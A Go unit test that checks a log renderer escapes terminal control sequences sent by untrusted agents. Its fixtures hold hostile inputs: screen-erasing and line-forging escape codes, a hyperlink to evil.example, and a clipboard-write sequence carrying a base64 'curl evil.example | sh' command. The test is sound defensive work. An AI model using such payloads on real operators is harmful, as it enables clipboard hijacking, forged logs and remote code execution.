package cmd

import (
	"os"
	"strings"
	"testing"
	"time"

	"github.com/bluesky-social/slagworks/internal/slogkit"
)

// TestHumanRenderer_EscapesTerminalControls: agent envelopes reach global
// through the site's unauthenticated /logs/ingest, so every string field is
// text the sending host chose. `slagctl machine logs` must not let it drive
// the operator's terminal: an OSC 52 sequence would rewrite the clipboard,
// CSI sequences would erase the screen or forge lines, and an embedded
// newline would print a second, fake log line.
func TestHumanRenderer_EscapesTerminalControls(t *testing.T) {
	f, err := os.CreateTemp(t.TempDir(), "machine-logs")
	if err != nil {
		t.Fatal(err)
	}
	render := humanRenderer(f)
	envs := []slogkit.Envelope{
		{
			TS:     time.Now(),
			Source: slogkit.SourceAgent,
			Host:   "h\x1b[2Jost",
			Phase:  "partitioning\x1b]8;;http://evil.example/\x07",
			Msg:    "ok\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaAo=\x07 done\n12:00:00.000 [global] host op=00000000 operation completed",
		},
		{
			TS:     time.Now(),
			Source: slogkit.SourceAgent,
			Msg:    "exec",
			Extra: map[string]any{
				"argv":      "sgdisk \x1b[1A\x1b[2Kfake line",
				"exit_code": float64(1),
				"err":       "boom\r\x1b[32mOK\u009b2J",
			},
		},
		{TS: time.Now(), Source: slogkit.Source("global\x1b[1A"), MachineName: "db1\x1b]0;title\x07", Msg: "claimed"},
	}
	for _, env := range envs {
		if err := render(env, 1); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(f.Name())
	if err != nil {
		t.Fatal(err)
	}
	out := string(raw)

	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) != len(envs) {
		t.Errorf("rendered %d lines for %d envelopes (an embedded newline forged a line):\n%s", len(lines), len(envs), out)
	}
	for _, line := range lines {
		for _, r := range line {
			if r < 0x20 || r == 0x7f || (r >= 0x80 && r < 0xa0) {
				t.Errorf("rendered line carries terminal control %U: %q", r, line)
				break
			}
		}
	}
	// The operator still sees that something was there, as visible text.
	for _, want := range []string{
		`h\x1b[2Jost`, `phase=partitioning\x1b]8;;`, `ok\x1b]52;c;`, `\x07 done\n12:00:00.000`,
		`exec: sgdisk \x1b[1A\x1b[2Kfake line → exit 1 err=boom\r\x1b[32mOK\u009b2J`,
		`[global\x1b[1A] db1\x1b]0;title\x07`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("output missing the escaped text %q:\n%s", want, out)
		}
	}
}
